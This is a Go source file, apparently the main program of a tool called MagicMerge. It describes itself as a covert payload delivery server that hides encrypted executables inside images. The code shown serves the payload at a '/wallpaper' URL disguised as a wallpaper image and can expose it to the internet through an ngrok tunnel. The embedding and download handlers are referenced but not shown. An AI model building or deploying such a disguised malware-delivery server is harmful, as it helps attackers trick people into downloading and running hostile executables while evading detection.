package main

import (
	"flag"
	"fmt"
	"log"
	"net/http"
	"os"

	"github.com/logrusorgru/aurora/v3"
)

var asciiArt = `

	

___      ___       __       _______   __     ______   ___      ___   _______   _______    _______    _______  
|"  \    /"  |     /""\     /" _   "| |" \   /" _  "\ |"  \    /"  | /"     "| /"      \  /" _   "|  /"     "| 
 \   \  //   |    /    \   (: ( \___) ||  | (: ( \___) \   \  //   |(: ______)|:        |(: ( \___) (: ______) 
 /\\  \/.    |   /' /\  \   \/ \      |:  |  \/ \      /\\  \/.    | \/    |  |_____/   ) \/ \       \/    |   
|: \.        |  //  __'  \  //  \ ___ |.  |  //  \ _  |: \.        | // ___)_  //      /  //  \ ___  // ___)_  
|.  \    /:  | /   /  \\  \(:   _(  _|/\  |\(:   _) \ |.  \    /:  |(:      "||:  __   \ (:   _(  _|(:      "| 
|___|\__/|___|(___/    \___)\_______)(__\_|_)\_______)|___|\__/|___| \_______)|__|  \___) \_______)  \_______)                                                                                                               
`

var slogan = `
A sophisticated payload delivery server for cybersecurity professionals and red team operators. It offers a powerful yet covert method for embedding and encrypting executables within images, enabling secure payload delivery and execution in environments where discretion and evasion are paramount

Build: Beta
Version: 1.0.0
`

func main() {

	flag.Usage = usage
	flag.Parse()

	if *exeSource == "" {
		fmt.Println("")
		flag.Usage()
		os.Exit(1)
	}

	http.HandleFunc("/wallpaper", downloadHandler)
	go func() {
		fmt.Println(aurora.BrightRed((asciiArt)))
		fmt.Println(aurora.BrightGreen((slogan)))
		log.Println(aurora.BrightMagenta("Payload URL: http://localhost:8080/wallpaper"))
		if err := http.ListenAndServe(":8080", nil); err != nil {
			log.Fatalf("Failed to start server: %v", err)
		}
	}()

	if *useNgrok {

		url, err := startNgrok()
		if err != nil {
			log.Fatalf("Failed to start ngrok: %v", err)
		}
		//green := color.New(color.FgCyan)
		log.Println(aurora.Green("[Ngrok] Payload URL: ").String() + url + "/wallpaper")
	} else {
		log.Println("MagicMerge Running locally without ngrok.")
	}

	select {}
}
func usage() {
	fmt.Println(aurora.Green(asciiArt))
	fmt.Fprintf(os.Stderr, "Usage of %s:\n", os.Args[0])
	flag.PrintDefaults()
	fmt.Println("\nExample:")
	fmt.Println(os.Args[0] + " -payload=\"path/to/executable\" -url=false -ngrok=true")
}
